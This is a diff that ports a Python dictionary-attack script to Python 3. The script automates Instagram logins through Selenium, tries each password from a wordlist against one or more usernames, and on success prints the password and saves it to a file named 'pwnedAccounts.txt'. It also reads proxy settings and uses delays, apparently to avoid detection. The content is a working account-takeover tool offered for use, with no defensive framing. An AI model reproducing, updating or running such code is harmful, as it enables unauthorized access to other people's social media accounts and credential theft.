@@ -17,14 +17,14 @@ def userExists(username):
 		driver.get("https://instagram.com/"+username)
 		assert (("Page Not Found" or "no encontrada") not in driver.title)
 	except AssertionError:
-		print 'user: "%s" does not exist, trying with the next!' %username
+		print('user: "%s" does not exist, trying with the next!' %username)
 		return 1
 	except:
-		'uknown error'
+		'unknown error'
 
 def login(user, password, delay):
 	try:
-		print 'Trying with password: ' + password
+		print('Trying with password: ' + password)
 		elem = driver.find_element_by_name("username")
 		elem.clear()
 		elem.send_keys(user)
@@ -36,13 +36,13 @@ def login(user, password, delay):
 		assert (("Login") in driver.title)
 		#assert (("Your username or password was incorrect" or "son incorrectos.") not in driver.page_source)
 		#if driver.current_url == 'https://www.instagram.com/':
-		#	print 'Password correct!'
-		#	print '%s' %password
+		#	print('Password correct!')
+		#	print('%s' %password)
 		#else:
-		#	print 'Wrong password'
+		#	print('Wrong password')
 	except AssertionError:
-		print 'Access granted mother kaker!!'
-		print 'The password is: ' + password
+		print('Access granted mother kaker!!')
+		print('The password is: ' + password)
 		try:
 			f = open('pwnedAccounts.txt','a')
 		except:
@@ -52,7 +52,7 @@ def login(user, password, delay):
 		driver.delete_all_cookies()
 		return 1
 	except:
-		print "\r Check your connection to the internet mother kaker\r"
+		print("\r Check your connection to the internet mother kaker\r")
 
 def dictionaryAttack(usernames,passwords,delay):
 	if str(type(usernames)) == "<type 'list'>":
@@ -61,7 +61,7 @@ def dictionaryAttack(usernames,passwords,delay):
 				continue
 			driver.get("https://instagram.com/accounts/login/")
 			sleep(delay * 7)
-			print 'Trying with username: ' + username
+			print('Trying with username: ' + username)
 			for password in passwords:
 				if (login(username,password,delay) == 1):
 					cj.clear()
@@ -71,7 +71,7 @@ def dictionaryAttack(usernames,passwords,delay):
 			return
 		driver.get("https://instagram.com/accounts/login/")
 		sleep(delay * 7)
-		print 'Trying with username: ' + usernames
+		print('Trying with username: ' + usernames)
 		for password in passwords:
 			if (login(usernames,password,delay) == 1):
 				break
@@ -90,16 +90,16 @@ def main():
 		delay = 2
 	else:
 		delay = int(options.delay)
-	print 'Using %d seconds of delay' %delay
+	print('Using %d seconds of delay' %delay)
 
 	if ( (options.userfile == False) and (options.username == False) ) :
-		print 'You have to set an username or a userfile'
+		print('You have to set an username or a userfile')
 		exit()
 	if ( (options.userfile != False) and (options.username != False) ) :
-		print 'You can\'t set both options at once.. choose between username or userfile'
+		print('You can\'t set both options at once.. choose between username or userfile')
 		exit()
 	if (options.dictionary == False):
-		print 'You have to set a valid path for the passwords dictionary'
+		print('You have to set a valid path for the passwords dictionary')
 		exit()
         if options.proxy:
             with open('proxy.yaml', 'r') as f:
@@ -121,7 +121,7 @@ def main():
 			passwords.append(line.strip('\n'))
 		f.close()
 	except:
-		print 'Check the path to the dictionary and try again'
+		print('Check the path to the dictionary and try again')
 		exit()
 
 	if (options.userfile != False):
@@ -136,7 +136,7 @@ def main():
 				usernames.append(line.strip('\n'))
 			f.close()
 		except:
-			print 'Check the path to the users file and try again'
+			print('Check the path to the users file and try again')
 			exit()
 
         	driver = webdriver.Firefox(profile)
